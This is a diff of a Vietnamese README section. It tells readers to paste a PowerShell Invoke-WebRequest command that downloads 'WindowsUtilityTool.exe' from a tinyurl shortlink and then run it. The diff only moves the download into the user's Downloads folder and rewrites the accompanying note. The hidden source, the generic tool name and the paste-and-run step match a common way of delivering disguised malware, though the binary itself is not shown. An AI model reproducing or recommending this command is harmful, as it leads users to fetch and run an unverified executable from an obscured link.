@@ -23,10 +23,10 @@
 Bạn có thể tải phiên bản mới nhất về máy tính một cách nhanh chóng bằng cách mở **PowerShell** và dán vào dòng lệnh sau:
 
 ```powershell
-Invoke-WebRequest -Uri "https://tinyurl.com/Doctoten" -OutFile "WindowsUtilityTool.exe"
+Invoke-WebRequest -Uri "https://tinyurl.com/Doctoten" -OutFile "$env:USERPROFILE\Downloads\WindowsUtilityTool.exe"
 ```
 
-> **Lưu ý**: Sau khi tải về, bạn có thể chạy file `WindowsUtilityTool.exe` trực tiếp từ thư mục hiện tại của PowerShell.
+> **Lưu ý**: Lệnh trên sẽ tự động tải file `WindowsUtilityTool.exe` vào thư mục **Downloads** của bạn. Sau khi tải xong, bạn có thể chạy file từ đó.
 
 ---
 
